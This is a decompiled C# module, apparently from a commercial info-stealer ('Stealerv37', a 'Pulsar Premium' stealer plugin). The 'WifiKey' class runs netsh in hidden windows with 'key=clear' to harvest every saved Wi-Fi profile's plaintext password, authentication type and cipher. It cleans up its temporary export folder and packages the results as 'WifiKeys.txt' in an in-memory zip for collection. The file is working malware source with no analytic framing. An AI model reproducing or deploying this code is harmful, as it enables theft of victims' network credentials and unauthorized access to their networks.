// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Device.WifiKey
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Xml.Linq;

#nullable disable
namespace Intelix.Targets.Device;

public class WifiKey : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    WifiKey.WifiInfo[] arr = this.TryExportAndParseProfiles() ?? this.FallbackParseProfiles();
    if (arr == null || arr.Length == 0)
      return;
    int totalWidth1 = Math.Max("Profile".Length, this.MaxLength(arr, (Func<WifiKey.WifiInfo, string>) (r => r.Profile)));
    int totalWidth2 = Math.Max("Key".Length, this.MaxLength(arr, (Func<WifiKey.WifiInfo, string>) (r => r.Key)));
    int totalWidth3 = Math.Max("Authentication".Length, this.MaxLength(arr, (Func<WifiKey.WifiInfo, string>) (r => r.Authentication)));
    int totalWidth4 = Math.Max("Cipher".Length, this.MaxLength(arr, (Func<WifiKey.WifiInfo, string>) (r => r.Cipher)));
    List<string> values = new List<string>()
    {
      $"{"Profile".PadRight(totalWidth1)} | {"Key".PadRight(totalWidth2)} | {"Authentication".PadRight(totalWidth3)} | {"Cipher".PadRight(totalWidth4)}",
      new string('-', totalWidth1 + totalWidth2 + totalWidth3 + totalWidth4 + 9)
    };
    foreach (WifiKey.WifiInfo wifiInfo in arr)
    {
      string str1 = string.IsNullOrEmpty(wifiInfo.Profile) ? "N/A" : wifiInfo.Profile;
      string str2 = string.IsNullOrEmpty(wifiInfo.Key) ? "Not found" : wifiInfo.Key;
      string str3 = string.IsNullOrEmpty(wifiInfo.Authentication) ? "Not found" : wifiInfo.Authentication;
      string str4 = string.IsNullOrEmpty(wifiInfo.Cipher) ? "Not found" : wifiInfo.Cipher;
      values.Add($"{str1.PadRight(totalWidth1)} | {str2.PadRight(totalWidth2)} | {str3.PadRight(totalWidth3)} | {str4.PadRight(totalWidth4)}");
    }
    zip.AddTextFile("WifiKeys.txt", string.Join("\n", (IEnumerable<string>) values));
  }

  private int MaxLength(WifiKey.WifiInfo[] arr, Func<WifiKey.WifiInfo, string> selector)
  {
    if (arr == null || arr.Length == 0)
      return 0;
    int num = 0;
    for (int index = 0; index < arr.Length; ++index)
    {
      string str = selector(arr[index]) ?? "";
      if (str.Length > num)
        num = str.Length;
    }
    return num;
  }

  private WifiKey.WifiInfo[] TryExportAndParseProfiles()
  {
    string path = Path.Combine(Path.GetTempPath(), "IntelixWifiExport_" + Guid.NewGuid().ToString("N"));
    try
    {
      Directory.CreateDirectory(path);
    }
    catch
    {
      return (WifiKey.WifiInfo[]) null;
    }
    try
    {
      using (Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "netsh",
          Arguments = $"wlan export profile key=clear folder=\"{path}\"",
          UseShellExecute = false,
          RedirectStandardOutput = false,
          CreateNoWindow = true
        }
      })
      {
        process.Start();
        process.WaitForExit(5000);
      }
      string[] array = Directory.EnumerateFiles(path, "*.xml").ToArray<string>();
      if (array.Length == 0)
        return (WifiKey.WifiInfo[]) null;
      List<WifiKey.WifiInfo> wifiInfoList = new List<WifiKey.WifiInfo>(array.Length);
      foreach (string str1 in array)
      {
        try
        {
          XDocument xdocument = XDocument.Load(str1);
          string withoutExtension = xdocument.Descendants().FirstOrDefault<XElement>((Func<XElement, bool>) (e => string.Equals(e.Name.LocalName, "name", StringComparison.OrdinalIgnoreCase) && e.Parent != null && string.Equals(e.Parent.Name.LocalName, "SSID", StringComparison.OrdinalIgnoreCase)))?.Value;
          if (string.IsNullOrEmpty(withoutExtension))
            withoutExtension = Path.GetFileNameWithoutExtension(str1);
          string str2 = xdocument.Descendants().FirstOrDefault<XElement>((Func<XElement, bool>) (e => string.Equals(e.Name.LocalName, "keyMaterial", StringComparison.OrdinalIgnoreCase)))?.Value;
          string str3 = xdocument.Descendants().FirstOrDefault<XElement>((Func<XElement, bool>) (e => string.Equals(e.Name.LocalName, "authentication", StringComparison.OrdinalIgnoreCase)))?.Value;
          string str4 = xdocument.Descendants().FirstOrDefault<XElement>((Func<XElement, bool>) (e => string.Equals(e.Name.LocalName, "encryption", StringComparison.OrdinalIgnoreCase)))?.Value;
          wifiInfoList.Add(new WifiKey.WifiInfo()
          {
            Profile = withoutExtension ?? "N/A",
            Key = string.IsNullOrEmpty(str2) ? "Not found" : str2,
            Authentication = string.IsNullOrEmpty(str3) ? "Not found" : str3,
            Cipher = string.IsNullOrEmpty(str4) ? "Not found" : str4
          });
        }
        catch
        {
        }
      }
      return wifiInfoList.ToArray();
    }
    catch
    {
      return (WifiKey.WifiInfo[]) null;
    }
    finally
    {
      try
      {
        if (Directory.Exists(path))
          Directory.Delete(path, true);
      }
      catch
      {
      }
    }
  }

  private WifiKey.WifiInfo[] FallbackParseProfiles()
  {
    string[] profiles = this.Profiles();
    if (profiles == null || profiles.Length == 0)
      return new WifiKey.WifiInfo[0];
    WifiKey.WifiInfo[] results = new WifiKey.WifiInfo[profiles.Length];
    Parallel.For(0, profiles.Length, (Action<int>) (i =>
    {
      string str = profiles[i];
      try
      {
        using (Process process = new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            FileName = "netsh",
            Arguments = $"wlan show profile name=\"{str}\" key=clear",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            CreateNoWindow = true,
            StandardOutputEncoding = Encoding.UTF8
          }
        })
        {
          process.Start();
          string end = process.StandardOutput.ReadToEnd();
          process.WaitForExit();
          string match1 = this.GetMatch(end, "Key Content\\s*:\\s*(.+)");
          string match2 = this.GetMatch(end, "Authentication\\s*:\\s*(.+)");
          string match3 = this.GetMatch(end, "Cipher\\s*:\\s*(.+)");
          results[i] = new WifiKey.WifiInfo()
          {
            Profile = str,
            Key = string.IsNullOrEmpty(match1) ? "Not found" : match1,
            Authentication = string.IsNullOrEmpty(match2) ? "Not found" : match2,
            Cipher = string.IsNullOrEmpty(match3) ? "Not found" : match3
          };
        }
      }
      catch
      {
        results[i] = new WifiKey.WifiInfo()
        {
          Profile = str,
          Key = "Error",
          Authentication = "Error",
          Cipher = "Error"
        };
      }
    }));
    return results;
  }

  private string[] Profiles()
  {
    try
    {
      using (Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "netsh",
          Arguments = "wlan show profiles",
          UseShellExecute = false,
          RedirectStandardOutput = true,
          CreateNoWindow = true,
          StandardOutputEncoding = Encoding.UTF8
        }
      })
      {
        process.Start();
        string end = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        char[] separator = new char[2]{ '\r', '\n' };
        string[] strArray = end.Split(separator, StringSplitOptions.RemoveEmptyEntries);
        List<string> stringList = new List<string>();
        foreach (string str1 in strArray)
        {
          int num = str1.LastIndexOf(':');
          if (num >= 0 && num + 1 < str1.Length)
          {
            string str2 = str1.Substring(num + 1).Trim();
            if (!string.IsNullOrEmpty(str2))
              stringList.Add(str2);
          }
        }
        return stringList.ToArray();
      }
    }
    catch
    {
      return new string[0];
    }
  }

  private string GetMatch(string input, string pattern)
  {
    if (string.IsNullOrEmpty(input))
      return string.Empty;
    Match match = Regex.Match(input, pattern, RegexOptions.IgnoreCase | RegexOptions.Multiline);
    return !match.Success ? string.Empty : match.Groups[1].Value.Trim();
  }

  private class WifiInfo
  {
    public string Profile;
    public string Key;
    public string Authentication;
    public string Cipher;
  }
}
